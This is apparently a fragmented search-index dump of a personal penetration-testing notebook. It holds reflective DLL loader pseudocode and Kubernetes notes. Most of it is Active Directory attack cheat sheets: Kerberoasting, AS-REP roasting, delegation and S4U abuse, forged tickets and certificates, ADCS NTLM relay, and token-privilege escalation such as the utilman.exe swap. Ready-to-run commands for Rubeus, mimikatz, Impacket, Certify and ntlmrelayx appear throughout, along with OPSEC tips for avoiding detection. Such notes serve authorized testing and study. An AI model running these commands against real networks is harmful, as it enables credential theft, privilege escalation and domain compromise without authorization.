be handled differently:\n\n\n\nName\nValue\nDescription\n\n\n\n\nIMAGE_REL_BASED_ABSOLUTE\n0x00\nThe relocation is skipped. It is often used to pad a block\n\n\nIMAGE_REL_BASED_HIGH\n0x01\nThe 16 high bits of the offset is added to the current relocation value\n\n\nIMAGE_REL_BASED_LOW\n0x03\nThe 16 low bits of the offset is added to the current relocation value\n\n\nIMAGE_REL_BASED_HIGHLOW\n0x04\nThe 32 bits of the offset is added to the current relocation value\n\n\nIMAGE_REL_BASED_DIR64\n0x10\nThe 64 bits of the offset is added to the current relocation value\n\n\n\nThe following code can be used to handle the relocations:\n// pseudo code \n// PVOID startAddress : the actual PE load address\n// IMAGE_BASE_RELOCATION* currentRelocation : the actual relocation block\n\n// Compute the offset\nDWORD64 offset = startAddress - ntHeader->OptionalHeader.ImageBase;\n\n// Get the first relocation entry in the block\nIMAGE_RELOCATION_ENTRY* relocationEntry = &currentRelocation[1];\n\n// Parse all relocation entry in the relocation block\nwhile(relocationEntry SizeOfBlock){\n    // Get the relocation address\n    DWORD64 relocationRVA = currentRelocation->VirtualAddress + relocationEntry->Offset;\n    DWORD64 *relocationAddress = startAddress + relocationRVA;\n\n    // Process the relocation\n    switch(relocationEntry->Type){\n        case IMAGE_REL_BASED_HIGH:\n            // 16 high bits\n            *relocationAddress += HIWORD(offset);\n            break;\n        case IMAGE_REL_BASED_LOW:\n            // 16 low bits\n            *relocationAddress += LOWORD(offset);\n            break;\n        case IMAGE_REL_BASED_HIGHLOW:\n            // 32 bits\n            *relocationAddress += (DWORD)offset;\n            break;\n        case IMAGE_REL_BASED_DIR64:\n            // 64 bits\n            *relocationAddress += offset;\n            break;\n        default:\n            break;\n    }\n    relocationEntry ++;\n}\n\nThus, at this moment, all relocations had been performed and the program should work whatever its load address.\nHowever, what happens if the DLL uses functions defined in another DLL ? In this case, the DLL must be imported and the functions address must be resolved.\nProcess imported functions\nDLL have dependencies. Indeed, the DLL could use functions defined in other DLL. For example, the KERNEL32.DLL has the NTDLL.DLL as dependencies : VirtualAlloc will call NtAllocateVirtualMemory.\nThus, these references must also be resolved.\nImport Directory Table\nThe Import Directory Table is located in the .idata section and contains one entry for every DLL used by the PE.\nThe Import Directory Table entry can be parsed using the following structure:\ntypedef struct _IMAGE_IMPORT_DESCRIPTOR {\n    union {\n        DWORD   Characteristics;\n        DWORD   OriginalFirstThunk;\n    } DUMMYUNIONNAME;\n    DWORD   TimeDateStamp;\n    DWORD   ForwarderChain;\n    DWORD   Name;\n    DWORD   FirstThunk;\n} IMAGE_IMPORT_DESCRIPTOR;\n\nè\nOnce the DLL name is known, it must be loaded using a recursive call or using LoadLibrary. However, the use of LoadLibrary is kind of problematic as it will raise several kernel events.\nThen, the ILT must be parsed to fill the IAT.\nIAT and ILT\nThe IAT is a table that will contain the address of the resolved symbols ie the function addresses resolved through GetProcAddress. This table is usually empty when the process start and is filled depending on the ILT information.\nThe ILT is a lookup table containing information about the imported function such as its name, its ordinal etc... The ILT information is used to resolve the imported function address that will be stored in the IAT.\nThe ILT and IAT entries can be parsed using the following structure:\ntypedef struct _IMAGE_THUNK_DATA {\n    union {\n        ULONGLONG ForwarderString;\n        ULONGLONG Function;       \n        ULONGLONG Ordinal;\n        ULONGLONG AddressOfData;  \n    } u1;\n} IMAGE_THUNK_DATA;\n\nFor the ILT the interesting parameters are :\n\nThe AddressOfData parameter that contains the function name RVA. This address points to the IMAGE_IMPORT_BY_NAME structure that can be used to retrieve the function name as a simple string. This string can then be used with GetProcAddress to retrieve the function address.\nThe Ordinal parameter that contains the function ordinal and can be used to resolve the function address through GetProcAddress\n\nFor the IAT the interesting parameter is :\n\nThe Function parameter that will receive the function resolved address\n\nThus, the idea is to parse the while ILT, use the AddressOfData or Ordinal parameter to resolve the function address and write it in the IAT's Function value.\nFill the IAT\nThe following code can be used to process the imported functions:\n// pseudo code\n\n// Get the first Import Directory Table entry\nIMAGE_IMPORT_DESCRIPTOR* importDescriptor = startAddress + ntHeaders->OptionalHeader->dataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;\n\n// Iterate through all Import Directory Table entries\nfor (SIZE_T i = 0; importDescriptor->Name; importDescriptor++) {\n    // Get the IAT and ILT first entry\n    PIMAGE_THUNK_DATA iat = startAddress + importDescriptor->FirstThunk;\n    PIMAGE_THUNK_DATA ilt = startAddress + importDescriptor->OriginalFirstThunk;\n\n    // Get the associated DLL name\n    char* dllName = startAddress + importDescriptor->Name;\n\n    // Load the DLL\n    // For clean read, the LoadLibrary function is used\n    HMODULE dllHandle = GetModuleHandleA(dllName);\n    if (!dllHandle) {\n        dllHandle = LoadLibraryExA(dllName, NULL, NULL);\n        if (!dllHandle) {\n            return FALSE;\n        }\n    }\n\n    // Iterate through the ILT entries\n    for (; ilt->u1.Function; iat++, ilt++) {\n        // Check if the function is given as an ordinal\n        if (IMAGE_SNAP_BY_ORDINAL(ilt->u1.Ordinal)) {\n            // Resolve function name through its ordinal\n            LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(ilt->u1.Ordinal);\n            // Write function address into the IAT's corresponding entry\n            iat->u1.Function = (DWORD_PTR)GetProcAddress(dllHandle, functionOrdinal);\n        }\n        else {\n            // Load the HINT structure from the ILT information \n            // The HINT structure contains address to the function name\n            IMAGE_IMPORT_BY_NAME* hint = startAddress + ilt->u1.AddressOfData;\n            // Write function address into the IAT's correspond entry\n            iat->u1.Function = GetProcAddress(dllHandle, hint->Name);\n        }\n    }\n}\n\nAt this moment, the DLL dependencies are loaded.\nDelayed Import Table\nThe Delayed Import Table works exactly like the standard Import Directory Table. This table has been added to support an uniform mechanism for applications to delay the DLL until one of its exported functions is used.\nTo avoid any problem, this table will be processed exactly as the Import Directory Table. The only difference is that this table entries will be parsed using the following structure:\ntypedef struct _IMAGE_DELAYLOAD_DESCRIPTOR {\n    union {\n        DWORD AllAttributes;\n        struct {\n            DWORD RvaBased : 1;            \n            DWORD ReservedAttributes : 31;\n        } DUMMYSTRUCTNAME;\n    } Attributes;\n\n    DWORD DllNameRVA;                      \n    DWORD ModuleHandleRVA;                 \n    DWORD ImportAddressTableRVA;           \n    DWORD ImportNameTableRVA;              \n    DWORD BoundImportAddressTableRVA;      \n    DWORD UnloadInformationTableRVA;       \n    DWORD TimeDateStamp;                   \n\n\n} IMAGE_DELAYLOAD_DESCRIPTOR\n\nThe DLLNameRVA value contains the RVA to the DLL name.\nThe ImportAddressTableRVA contains the IAT's RVA. Likewise, the ImportNameTableRVA contains the ILT's RVA.\nBesides, nothing changes and the previous code used to parse the Import Directory Table can be used as is.\nTLS Callback et DLL Main\nTLS Callback\nThe TLS Callback are function ran before the entry point. They are often used by malware as anti-debug techniques but also by legit DLL to set up the environment.\nBefore running the DLL main, these callbacks must be run. They can be found in the PE DataDirectory in the Entry TLS parameter. The following code can be used to run these functions:\n// pseudo code\n\n// Check if any TLS callback is defined\nif (dllParsed->dataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) {\n\n    // Get the TLS information\n    PIMAGE_TLS_DIRECTORY tlsDir = startAddress + dllParsed->dataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress\n\n    // Get the TLS function address\n    PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)(tlsDir->AddressOfCallBacks);\n    for (; *callback; callback++) {\n        // Call the function\n        (*callback)((PVOID)dllParsed->baseAddress, DLL_PROCESS_ATTACH, NULL);\n    }\n}\n\nDLL Main\nThe DLL main function is the function called when the DLL is loaded by the system. The following code is an example of DLL Main:\nBOOL WINAPI DllMain(\n    HINSTANCE hinstDLL,  // handle to DLL module\n    DWORD fdwReason,     // reason for calling function\n    LPVOID lpvReserved )  // reserved\n{\n    // Perform actions based on the reason for calling.\n    switch( fdwReason ) \n    { \n        case DLL_PROCESS_ATTACH:\n         // Initialize once for each new process.\n         // Return FALSE to fail DLL load.\n            break;\n\n        case DLL_THREAD_ATTACH:\n         // Do thread-specific initialization.\n            break;\n\n        case DLL_THREAD_DETACH:\n         // Do thread-specific cleanup.\n            break;\n\n        case DLL_PROCESS_DETACH:\n\n            if (lpvReserved != nullptr)\n            {\n                break; // do not do cleanup if process termination scenario\n            }\n\n         // Perform any necessary cleanup.\n            break;\n    }\n    return TRUE;  // Successful DLL_PROCESS_ATTACH.\n}\n\nWhen the DLL is loaded, the event DLL_PROCESS_ATTACH is used. The following code can be used to call the DLL main:\n// pseudo code\n\ntypedef BOOL(WINAPI* LPDLLMAIN)(DWORD_PTR image_base, DWORD reason, LPVOID reserved);\n\nLPDLLMAIN entryPoint = (LPDLLMAIN)startAddress + dllParsed->ntHeader->OptionalHeader.AddressOfEntryPoint);\nif(entrypoint) {\n    BOOL status = entryPoint((HINSTANCE)dllParsed->baseAddress, DLL_PROCESS_ATTACH, NULL);\n}\n\nFrom now, the DLL should be fully loaded and the exported function can be used.\nGetProcAddress\nThe Windows GetProcAddress will not work with the loaded DLL and I wasn't able to understand why. Indeed, the GetProcAddress function requires a handle to the DLL (HMODULE). The HMODULE type simply represents the DLL base address. However, even when the loaded DLL base address is given to the GetProcAddress function, it cannot find the exported function.\nThus, a custom GetProcAddress function must be developed.\nThe PE header contains all the information needed to access to the exported function name and addresses. Indeed, the DataDirectory contains the ExportDirectory address that can be used to access to the AddressOfFunctions, AddressOfNames and AddressOfNameOrdinals tables.\nThe AddressOfNames is a table containing the names of the exported functions.\nThe AddressOfFunctions is a table containing the address of the exported functions.\nThe AddressOfNameOrdinals is a lookup table used to link the names from the AddressOfNames to the address from the AddressOfFunctions.\nThe following code can be used as a custom GetProcAddress:\n// pseudo code\n\nDWORD exportDirectoryRVA = (DWORD)dllParsed->dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;\nIMAGE_EXPORT_DIRECTORY exportDirectory = startAddress + exportDirectoryRVA;\nLPDWORD AddressOfFunctions = startAddress + exportDirectory->AddressOfFunctions;\nLPDWORD AddressOfNames = startAddress + exportDirectory->AddressOfNames;\nLPWORD AddressOfNameOrdinals = startAddress + exportDirectory->AddressOfNameOrdinals;\n\nfor (SIZE_T i = 0; i NumberOfFunctions; i++) {\n    char *name = (char*)((DWORD64)startAddress + AddressOfNames[i]);\n    if (strcmp(name, functionName) == 0) {\n        DWORD64 functionRVA = AddressOfFunctions[AddressOfNameOrdinals[i]];\n        return startAddress + functionRVA;\n    }\n}\n\n"},"Malware/Docs/Tools/IDA.html":{"url":"Malware/Docs/Tools/IDA.html","title":"IDA","keywords":"","body":"IDA\n\n\nDecompiler view\nRename symbol\nRetype symbol\nGet reference from an imported function\nPrevious click\n\n\nDecompiler view\nF5\nRename symbol\nn\nRetype symbol\ny\nGet reference from an imported function\n\nGo to the import tab\nDouble click the function\nType x on the symbol to open the xref window\n\nPrevious click\nESC\n"},"Malware/Docs/Tools/Radare2.html":{"url":"Malware/Docs/Tools/Radare2.html","title":"R2","keywords":"","body":"Radare2\nPlay with empty buffers\nRun radare2 with empty buffer\nIf you want to try doing some shellcode sheningans without needing to load a full file you can use the r2 empty buffer\nr2 -\nr2  malloc://${bufferSizeInBytes} \n# r2 malloc://512\n\nWrite in the empty buffer\nOnce r2 has been run and the buffer initialized, you can use w to write a binary shellcode from a file into the allocated buffer or use wx to write an hexa shellcode into the allocated buffer\nwx 554889e548c705....\n\nEmulate the ASM written in the buffer\n# Initialize the VM\naei \n# Initialize the stack\naeim\n# Initialize the program counter\n\nThe go in visual mode with V and go to the ASM and registry view with P and type F7 to step into or F8 to step over the instruction\nVisual mode\nYou can type V to enter the visual mode.

created by Kubernetes.\nThe most famous one is Docker but others can be used such as containerd that is today officialy pushed by Kubernetes.\nDocker is now depracted by Kubernetescause it does not expose a standardized API. Moreover, Docker is not a CRI but a wrapper allowing to easily manage the containerd CRI.\nThis, if you are deploying a brand new Kubernetes infrastructure, it is recommended to use containerd.\nMaster Node\nThis node is used to orchestrate all nodes. \nIt hosts the Kubernetes API.\nPod Network Controller (PNC)\nA Pod Network is a way to allow communication between different nodes in the cluster.\nInstalling a PNC is a way to save a lot of time by discharging the network configuration to another service.\nSeveral PNC exist. The most famous are :\n\nFlannel : this PNC is a layer 3 controller based on VLAN\nCalico : this PNC is a layer 2 controller base on NAT et supporte les networkPoliciesde Kubernetes via le fichier /etc/calico/calicoctl.cfg\n\nServices\nThe services allows to expose an application running on pods\nkubectl expose deployment/${deployementName} --type=\"NodePort\" --port ${appPort} --target-port\n\nCommands\nList nodes\nkubectl get nodes\n\n\n\nList pods\nkubectl get pods ${options}\n\n\n--all-namespaces : display all pods whatever their namespaces\n-l app=$appName : display the pods related to an application.

This request asks for a TGT with a secret derived from the user password\nThe KDC verify the secret key and return the TGT as an AS-REP message if the secret key can be validated against the user password stored in the AD.\n\n\nThe TGT contains the user identity and is encrypted using the KDC secret key (ie the krbtgt account password)\n\n\nWhen the user wants to access a service, it asks for a Ticket Granting Service (TGS) to the KDC through a TGS-REQ message with the Service Principal Name (SPN) and its TGS. The SPN identify the service and the TGS authenticate the user.\n\n\nAn SPN is an identifier linking the service instance with a logon account. They are configured in the User Object in AD\n\n\nThe KDC verify that the user TGT and then sends back the TGS through a TGS-REP message. The KDC does not verify if the user can access the service, but when the service is reached and a TGS is presented as a means of authentication, it will inspect the ticket and decide whereas the user is authorized to access the service or not.\n\n\nA TGS for a given service can be generated even if the user is not authorized to access the service. The KDC is for authentication only and not authorization.\nThe TGS is encrypted with the service account password\n\nBruteforce users\nKerberos can be used to enumerate valid users on the domain.\nUse kerbrute:\nkerbrute userenum --domain ${domainName} ${userList} --dc ${dcIp}\n\nKerberoasting\nPart of the TGS is encrypted with the service account password. It is then possible to crack them offline to retrieve the service account password.\n\nKerberosting is not really OPSEC : an event is 4769 is generated when a service ticket is generated.\n\nSome companies use fake service accounts as honey pot. When a ticket is requested for this fake service account, an alert is raised.\nThus, when wanting to perform Kerberoast attacks, search manually service accounts and ask for a TGS selectively.\nThe following LDAP query can be used to look at SPN account:\n# LDAP\n(&(sAMAccountType=805306368)(servicePrincipalName=*))\n\n# Bloodhound\nMATCH (u:User {hasspn:true}) RETURN u\n\nImpacket can be used to get the ticket from these users:\nimpacket-GetUserSPNs ${domain}/${user}:{password} -request -dc-ip 10.10.10.169\n\nWorth a try without any password\nimapcket-GetUserSPNs ${domain}/${user} -request -dc-ip 10.10.10.169 -no-pass\n\nAS-REP Roasting\nIf a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user. Then the TGS can be cracked to retrieve the password.\nThe following LDAP query can be used to retrieve users impacted:\n# LDAP\n(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\n\n# Bloodhound\nMATCH (u:User {dontreqpreauth:true}) RETURN u\n\n\nAS-REP is not OPSEC and should not be used \n\nA list of possible username can be generated using username-anarchy or namemash\nwhile read p; do GetNPUsers.py ${domain}/\"$p\" -request -no-pass -dc-ip ${dcIp} >> hash.txt; done \n# The / at the end is mandatory\nimpacket-GetNPUsers -no-pass -usersfile ${usersList} -format john -dc-ip ${dcIp} ${domain}/\n\nUnconstrained delegation\nOverview\nDelegation allows a user or a service to act on behalf of another user to another service. For example, if an exposed service is used as a proxy to a database, the user will authenticate on the exposed service and the service will be able to authenticate itself on the behalf of the user to the database.\nWhen a service with Unconstrained Delegation authenticate to another service, its TGS used to authenticate on the remote service will contain the TGT of the user connecting to the local service. This TGT will be cached in memory.\nSo if an admin access to a service with unconstrained delegation, its TGT will be cached in memory. Thus, if the machine is compromised, all TGT can be dumped to impersonate users.\nUnconstrained Delegation can be found using the following LDAP request:\n# LDAP\n(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\n\n# Bloodhound\nMATCH (c:Computer {unconstraineddelegation:true}) RETURN c\n\nRubeus can be used to monitor and dump TGT on a machine. When a TGT is found, it can then be injected on the user session with CobaltStrike:\n\nRetrieve the base64 ticket and write it in a .kirbi file\nCreate sacrificial logon session : make_token ${domain}\\${user} fakePassword\nInject the TGT: kerberos_ticker_use ${pathToKirbi}\n\nPrinter Bug\nThis bug allows an adversary to coerce a forest's machine (MACHINE A) to perform authentication on another forest's machine (MACHINE B). The authentication is triggered through RPC calls such as RpcRemoteFindFirstPrinterChangeNotificationEx that notify a change between a printer server (MACHINE A) and a printer client (MACHINE B), hence the authentication of the \"new\" printer server to the client.\nIf the MACHINE B is configured with Unconstrained Delegation, it will be possible to retrieve a TGT for MACHINE A on MACHINE B. Hence, using this MACHINE A TGT it will be possible to retrieve TGS for every service on MACHINE A and thus compromise the machine.\nIf MACHINE A is a Domain Controller, you will compromise the domain.\nThe proof of concept code can be found here.\nOn the MACHINE B configured with Unconstrained Delegation a run Rubeus to monitor for new TGT:\nRubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap\n\nOn your workstation, run the SpoolSample proof of concept on your workstations:\nSpoolSample.exe ${MACHINE A} ${MACHINE B}\n\nOnce the MACHINE A TGT is retrieved, it can be injected in the CS session using make_token and kerberos_ticket_use as explained in the Unconstrained Delegation part.\nResource based Constrained Delegation\nWith Constrained Delegation the server does not cache the TGT anymore, but will be able to request TGS for specific services on the behalf of other users with its own TGT.\nThe Constrained Delegation computers can be found using the following LDAP request:\n# Search for user AND computer as Constrained Delegation can be configured for both these objects\n# LDAP\n(&(objectCategory=computer)(msds-allowedtodelegateto=*))\n\n# Bloodhound\nMATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p\n\nTo run RBCD attack, you must control a object considered as a service by Kerberos. Usually one of these:\n\nA user account having a ServicePrincipalName set\nAn account with a trailing $ in the sAMAccountName (i.e. a computer accounts)\n\nConfigure RBCD\nIf you have the privileges to write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of another resource (GenericWrite, specific ACE), you can configure RBCD on this objects.\nThe StandIn tool can be used to ease configuration of RBCD on a remote ressource.\nFirst, create the new machine (this step can be ignored if you already control a machine account):\nStandin.exe --computer ${computerName} --make\n\nThen, configure the RBCD on the target machine and add the newly created machine as an msDS-AllowedToActOnBehalfOfOtherIdentity in the target machine:\nStandin.exe --computer ${targetMachineName} --sid ${createdComputerSID}\n\nYou can check that the configuration has been succesfully performed:\nStandIn.exe --object samaccountname=${targetMachineName}\nYou should see your newly created computer SID in the msds-allowedtoactonbehalfofotheridentity part on the response.\nExploit\nTo exploit the Constrained Delegation the TGT of the server must be retrieved using mimikatz:\nmimikatz sekurlsa::ekeys\n\n# Use the AES keys to generate a `TGT`\n# You can use Rubeus hash to compute aes key from NTLM/RC4 or plaintext password\nRubeus.exe asktgt /user:${machineAccount} /aes256:${aesKey} /opsec /nowrap\n\nOr Rubeus:\nRubeus.exe triage\n\nThen, a TGS can be generated. This TGS, generated with the Constrained Delegation server TGT, will impersonate the user:\n# machineAccount : the machine account created or already controlled\n# spnToImpersonate : cifs/targetResource, you can set what you want as service\n# userToImpersonate : usually a local administrator on the target resource\nRubeus.exe s4u /impersonateuser:${userToImpersonate} /msdsspn:${spnToImpersonate} /user:${machineAccount} /ticket:${base64TGT} /nowrap\n\n\ns4u does not check the spn using the /altservice:${serviceName} parameter. Thus, you can in fact ask a TGS for any service of the machine contained in the Constrained Delegation parameter.\n\nS4U Self abuse\nThe Service For User (S4U) contains two interesting extensions:\n\nService For User To Self which allows a service to obtain a TGS on behalf of another user \nService For User to Proxy which allows a service to obtain a TGS on behalf of another user on another service\n\nDuring Constrained Delegation exploit, these two extensions are used to first obtain a TGS on the Constrained Delegation machine on behalf of the user using S4U2Self and then, to obtain TGS on the specific targeted service on the remote machine using S4U2Proxy.\nThe S4U can be leveraged to escalate from System Account to Administrator on a machine.\nGet a TGT\nIndeed, even if running with local service account, the network connections are authenticated using the Computer Account. It is then possible to retrieve a TGT for the Computer Account using Rubeus:\n./Rubeus.exe tgtdeleg /nowrap\n\nGet a TGS\nThen, once the TGT is acquired, a TGS is generated. This TGS is generated using S4USelf and will impersonate a user that IS a machine local admin (Domain Administrator for example):\nRubeus.exe s4u /user:${computerAccount} /msdsspn:cifs/${computerDNS} /impersonateuser:${localAdmin} /ticket:${TGT} /nowrap\n\nThe Rubeus execution will fail when trying the S4UProxy step, but the ticket generated by S4USelf will be printed.\nFix the service name\nThe generated ticket is not crafted with an interesting service name. However, the service name is not included in the TGS ciphered data and can be modified at will.\nThe TGS can be modified using ASN1Editor. Change the instances where GENERAL \"${computerAccount} appears:\n\nReplace the string with cifs\nOn the parent sequence, add a new string node with 1b as tag fields and the machine FQDN as value\nSave the ticket\n\nOr, simply through Rubeus:\nRubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt\n\nYou can use Rubeus to ensure the ticket has been well modified :\nRubeus.exe describe /ticket:${pathToTicket}\n\nYou can now inject the ticket in your session.\n\nLook at this lab to test the technique !\n\nPlay with krbtgt\nSilver Ticket\nThe Silver Ticket is a TGS signed with a computer account key.\nWhen the computer account key material is retrieved, it is possible to forge a ticket for any user on any service on the machine.\n\nThe computer key change usually every 30 days\n\nThe following services can be interested:\n\nCIFS : allow the use of psexec\nHTTP : allow the use of winrm\nLDAP : allow dcsync on DC\n\nGolden Ticket\nA Golden Ticket is a TGT signed by the krbtgt account. When the Silver Ticket gives you access to a specific service on a specific host, the Golden Ticket can be used to retrieve a TGS on every services of every hosts.\n\nThe krbtgt secrets are usually not changed on a regular basis\n\nDiamond Ticket\nThe Golden Ticket can be easily detected as the attacker will request a TGS without requesting a TGT before, *ie the TGS-REQ will not have a matching AS-REQ.\nA Diamon Ticket will modify a TGT that have been legitimatly issued by the DC. Thus, to forge a Diamond Ticket, just retrieve a TGT and decrypt it, modify the fields you need and finaly re-encrypt it.\nForged Certificate\nADCS are usually less secured than DC.\nIf an attacker retrieves the CA private key, he will be able to sign forged certificates.\nThe CA private key can be extracted using SharpDPAPI:\nSharpDPAPI.exe certificates /machine\n\nOnce the key is extracted in a .pem file, it is converted into .pfx format. Then, ForgeCert can be used to forge a new certificate:\nForgeCert.exe --CaCertPath ${pathCAPfx} --CaCertPassword ${pfxPassword} --Subject \"CN=User\" --SubjectAltName \"${impersonatedUser}\" --NewCertPath .\\fakeCert.pfx --NewCertPassword pass123\n\nThen, Rubeus can be used to get a TGT using the certificate.\n\nIt is also interesting to generate certificate for machine and use the S4U2Self Abuse trick to compromise the machine\n\n"},"Pentest/Services/LDAP.html":{"url":"Pentest/Services/LDAP.html","title":"LDAP","keywords":"","body":"Ldap\nTable of content\n\n\nNmap\nWindapsearch\nConnection\nGet users description\n\n\nImpacket\nPython\nAD\nPython bloodhound\n\n\n\n\nNmap\nnmap -n -sV --script \"ldap* and not brute\" ${ip}\n\nWindapsearch\nConnection\nWith standard windasearch\n# https://github.com/ropnop/windapsearch\npython3 windapsearch.py -d ${domain} --dc-ip ${dcIp} -U\n\nGet users description\nWith go-windapsearch\n./windapsearch-linux-amd64 -u alice --hash '7f004ce6b8f7b2a3b6c477806799b9c0' --dc 10.11.1.20 -m custom --filter '(&(objectclass=user)(!(objectclass=computer)))' --attrs description\n\nImpacket\n# Impacket\nGetADUsers.py -all ${domain}/ -dc-ip ${dcIp}\n\nPython\nimport ldap3\nserver = ldap3.Server('10.10.10.175', get_info = ldap3.ALL, port=389)\nconnection = ldap3.Connection(server)\nconnection.bind()\n# Get basic info\n# print(server.info)\n\n# Enumerate object from the ldap using the naming context returned by server.info\n# connection.search(search_base='CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')\n# print(connection.entries)\n\nAD\nPython bloodhound\npython\" -m bloodhound -u ${user} -p ${password} -ns ${dcIp} -d ${domain} -c all\n\nIf the DNS is not exposed by the DC, remplace dcIp by the DNS ip\n"},"Pentest/Services/Memcached.html":{"url":"Pentest/Services/Memcached.html","title":"Memcached","keywords":"","body":"Memcached\n\nPort: 11211\nProtocol: tcp\n\nTable of content\n\n\nGet stats\nAccess keys\n\n\nGet stats\n# Get version\necho \"version\" | nc -vn -w 1 ${ip} 11211 \n# Get status     \necho \"stats\" | nc -vn -w 1 ${ip} 11211  \n# Get slabs\necho \"stats slabs\" | nc -vn -w 1 ${ip} 11211\n\nsudo apt install libmemcached-tools\n# Get stats\nmemcstat --servers=${ip} \n# Get all items\nmemcdump --servers=${ip} \n# Get info inside the item(s)\nmemccat  --servers=${ip} ${key1} ${key2} ${key3}\n\nAccess keys\n# Get items of slabs with info  \necho \"stats items\" | nc -vn -w 1 ${ip} 11211 \n# Get key names (the 0 is for unlimited output size)\necho \"stats cachedump ${itemNumber} 0\" | nc -vn -w 1 ${ip} 11211\n# Get saved info\necho \"get ${itemName}\" | nc -vn -w 1 ${ip} 11211\n"},"Pentest/Services/NFS.html":{"url":"Pentest/Services/NFS.html","title":"NFS","keywords":"","body":"NFS - Mountd\n\nPort: 2049\nProtocol : tcp\n\nTable of content\n\n\nDescription\nShowmount\nMount share\n\n\nDescription\nNFS is a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory.

Certify can automatize the discovery of ADCS CA:\n.\\Certify.exe cas\n\nIt will thus print the ROOT CA, the Enrollement CA and the certificate templates.\nCertificate templates\nCertificate templates are used to speed up the deployement. They are designed to be duplicated and configured depending on the needs.\nSome misconfiguration on these tempaltes could allow an attacker to retrieve a certificate he should not be able to get.\nCertify automate the discovery of misconfigured templates:\n.\\Certify.exe find /vulnerable\n\nIf the user you control has WriteOwner, WriteDacl or WriteProperty on the certificate, it can be abused.\nIt is interesting to target certificates with Client Authentication uses.\nOnce a vulnerable template is found, it can be request using Certify. The following command is an example, parameters may change depending on the certificate:\n.\\Certify.exe request /ca:${caName}  /template:${templateName} /altname:${userToImpersonate}\n\nOnce the certificate is generated, it can be converted in PFX format:\nopenssl pkcs12 -in ${certFilePath} -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n\nThe certificate is ready to be used.\nIf the certificate is an Authentication Certificate, it is possible to request a TGT using Rubeus:\n.\\Rubeus.exe asktgt /user:${impersontedUser} /certificate:${base64PFX} /password:${pfxPassword} /nowrap\n\nADCS HTTP Endpoint\nThe ADCS servers can expose an HTTP service that allow users to enroll their certificates. Usually, this endpoint is located at /crtsrv and support Negotiate (based on Kerberos) and NTLM authentication.\nIf the endpoint support NTLM authentication, an attacker can relay a coerced authentication from a remote server to this endpoint in order to retrieve a certificate enrolled by the target computer.\nFor example, an attacker can coerce NTLM authentication from a DC using a PrinterBug, relay this authentication to the ADCS and retrieve a certificate enrolled with the DC$ identity.\nThis can be done using ntlmrelayx:\nntlmrelayx.py -t http://${adcsIp}/certsrv/certfnsh.asp -smb2support --adcs --no-http-server\nOnce the relay is setup, trigger the authentication using an arbitrary method such as the PrinterBug and you will retrieve the Certificate and the Computer Account TGT. Using the S4USelf abuse, you can then compromise the machine.\nPersistence\nThe ADCS can be used to maintain access on the domain. Indeed, if an authentication certificate is requested for a given user by an attacker, the attacker will be able to request TGT for this user as long as the certificat is valid.\nIt is possible to retrieve certificate with Client Authentication with Certify:\n.\\Certify.exe find /clientauth\n\nThen, find a certificate that can be enrolled with third party approval (Authorization Signature Required: 0).\nOnce the certificate is found, generate it with Certipy:\nCertify.exe request /ca:${caName} /template:${templateName}\n\n"},"Pentest/Techniques/Abuse tokens.html":{"url":"Pentest/Techniques/Abuse tokens.html","title":"Abuse Tokens","keywords":"","body":"Abuse Tokens\nTable of content\n\n\nSecurity Tokens\nDisplay token information\nWhoami\nProcess Explorer\n\n\nToken types\nPrimary token\nImpersonation token\n\n\n\n\nDuplicate token\nInteresting privileges\nSeImpersonatePrivilege\nSeAssignPrimaryPrivilege\nSeTcbPrivilege\nSeBackupPrivilege\nSeRestorePrivilege\nSeCreateTokenPrivilege\nSeLoadDriverPrivilege\nSeTakeOwnershipPrivilege\nSeDebugPrivilege\n\n\nResources\n\n\nSecurity Tokens\nEach users logged on the system get an access token.

This path is automatized through the Potatosuite.\nSeAssignPrimaryPrivilege\nIt use the same method than SeImpersonatePrivilege to retrieve a privileged token. Then, this privilege can be leveraged to assign a primary token to a new or suspended process.\nIndeed, with the privileged token, it is possible to derivate a primary token through the DuplicateTokenEx Windows API. Then this primary token can be assigned to a new process through the CreateProcessAsUser Windows API.\nSeTcbPrivilege\nThis privilege allows to use KERB_S4U_LOGON to : \n\nGet an impersonation token for any user without needing their credentials\nAdd an arbitrary group to the token\nSet the toeken's integrity level to medium and assign it to the current thread through the SetThreadToekn Windows API.\n\nSeBackupPrivilege\nThis privilege grant read access to the whole filesystem.

For exemple, a user can impersonate the token if it is for the same user and the integrity level is less or equal to the current process integrity level.\nThen, it is possible to create an impersonation token and add to it to privileged group SID.\nLikewise, it is possible to create an arbitrary token and include Administrator rights through NtCreateToken.\nSeLoadDriverPrivilege\nThis privilege allows to load and unload device drivers.\nThe exploitation path can be found here\nIn a nutshell the exploitation follows these steps:\n\nLoad a buggy kernel driver such as szkg64.sys\nExploit the driver vulnerability\n\nLikewise, the privilege can be used to remove security-related driver with the ftlMC ${driverName} builtin command.\nSeTakeOwnershipPrivilege\nThis privilege is similar to SeRestorePrivilege. It allows a process to take ownership of any object by granting write access to the object.\nThe exploitation follows these steps:\n\ntakeown.exe /f \"%windir%\\system32\"\nicalcs.exe \"%windir%\\system32\" /grant \"%username%\":F\nChange utilman.exe by cmd.exe\nLock the console and press Win+U\n\nSeDebugPrivilege\nAllows a process to debug another porcess including reading and writing memory.

